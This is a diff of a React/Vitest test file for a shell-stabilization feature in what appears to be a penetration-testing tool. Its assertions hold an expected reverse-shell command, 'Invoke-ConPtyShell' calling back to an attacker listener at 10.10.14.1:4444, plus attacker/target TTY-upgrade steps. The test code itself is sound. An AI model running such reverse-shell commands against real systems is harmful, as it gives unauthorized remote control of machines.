@@ -50,11 +50,15 @@ describe('F-34 Shell Stabilization & PTY Upgrade', () => {
       rows: 42,
       lhost: '10.10.14.1',
       lport: 4444,
+      resetTerminal: false,
     });
   });
 
-  it('defaults to nested_nc mode for SSH sessions and previews Ctrl+Z + stty raw -echo; fg', async () => {
-    const onStabilize = vi.fn().mockResolvedValue(undefined);
+  it('defaults to nested_nc mode for SSH sessions, previews Ctrl+Z + stty raw -echo; fg, and switches to Windows ConPTY', async () => {
+    let submittedReq: ShellStabilizeRequest | undefined;
+    const onStabilize = vi.fn().mockImplementation(async (req: ShellStabilizeRequest) => {
+      submittedReq = req;
+    });
     const onClose = vi.fn();
 
     render(
@@ -72,12 +76,32 @@ describe('F-34 Shell Stabilization & PTY Upgrade', () => {
 
     const modeSelect = screen.getByLabelText(/Session Topology Mode/i) as HTMLSelectElement;
     expect(modeSelect.value).toBe('nested_nc');
-    expect(screen.getByText('stty raw -echo; fg')).toBeInTheDocument();
+    expect(screen.getByText(/# Step 3 — on attacker: configure raw mode/)).toBeInTheDocument();
+    expect(screen.getByText(/Step 4 — on target: reset terminal/)).toBeInTheDocument();
 
-    // Switch to Windows ConPtyShell
-    const methodSelect = screen.getByLabelText(/PTY Spawn Method/i) as HTMLSelectElement;
-    fireEvent.change(methodSelect, { target: { value: 'conptyshell' } });
+    // Switch to Windows ConPTY
+    fireEvent.click(screen.getByRole('button', { name: /Windows Target/i }));
 
     expect(screen.getByText(/Invoke-ConPtyShell 10\.10\.14\.1 4444 -Rows 32 -Cols 120/)).toBeInTheDocument();
+    expect(screen.getByText(/Windows vs\. Linux Architecture/i)).toBeInTheDocument();
+
+    fireEvent.click(screen.getByRole('button', { name: /Stabilize Shell Now/i }));
+
+    await waitFor(() => {
+      expect(onStabilize).toHaveBeenCalledTimes(1);
+    });
+
+    expect(submittedReq).toEqual({
+      sessionId: 'ssh-kali-1',
+      method: 'conptyshell',
+      mode: 'windows_conpty',
+      shellPath: '/bin/bash',
+      term: 'xterm-256color',
+      cols: 120,
+      rows: 32,
+      lhost: '10.10.14.1',
+      lport: 4444,
+      resetTerminal: false,
+    });
   });
 });
